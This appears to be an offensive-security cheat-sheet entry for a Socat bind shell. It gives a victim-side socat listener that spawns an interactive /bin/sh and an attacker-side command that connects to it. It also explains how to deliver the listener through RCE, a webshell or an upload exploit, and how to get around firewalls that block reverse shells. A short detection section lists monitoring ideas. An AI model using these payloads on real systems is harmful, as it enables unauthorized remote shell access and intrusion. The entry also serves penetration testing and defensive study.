---
id: fd9843c8-45e3-44c8-8781-f53005717103
type: code
name: Socat-Bind-Shell-Connection
language: bash
verified: true
created_at: '2023-04-06T03:56:08.899762+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - bind-shell
  - socat
  - payload
validated: true
---

# Socat-Bind-Shell-Connection

## Code

```bash
user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 
user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Description

This code snippet provides the dual commands for establishing a Socat bind shell: the victim-side listener that opens a port and spawns a shell, and the attacker-side connection that relays an interactive terminal. It creates a stable, PTY-backed shell without needing additional tools like Netcat on the target.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| target.com | Domain or IP of the target machine for connection | 192.168.1.50 |
| 12345 | Listening port on the target | 4444 |

## Usage

Execute the victim command first on the target after uploading Socat (e.g., via initial RCE). Then run the attacker command from your machine to connect and gain shell access. Ideal for scenarios where reverse shells are blocked by firewalls. Deliver the victim command via webshell, Meterpreter, or file upload exploit.

## Detection

- Network monitoring for TCP listeners on unusual ports (e.g., via netstat, ss, or IDS rules for Socat traffic).
- Process monitoring for Socat executions with EXEC:/bin/sh or PTY options.
- Behavioral analytics detecting shell spawns from network-bound processes.
- File integrity checks for unauthorized Socat binaries.

## Related

- [[procedures/Socat-Bind-Shell]]
- [[tools/Socat]]
